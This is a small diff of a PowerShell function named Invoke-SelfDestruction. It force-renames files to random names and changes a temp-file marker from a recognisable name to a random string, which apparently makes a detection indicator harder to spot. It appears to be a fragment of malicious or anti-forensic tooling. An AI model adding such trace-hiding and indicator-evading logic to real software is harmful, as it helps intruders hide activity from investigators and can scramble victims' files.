@@ -34,7 +34,7 @@ function Invoke-SelfDestruction {
         Rename-Item -Path $f -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($f)) -Force
 
 
-        New-Item -Path "$env:temp\avax.txt" -ItemType File -Force
+        New-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -ItemType File -Force
     
 }
 
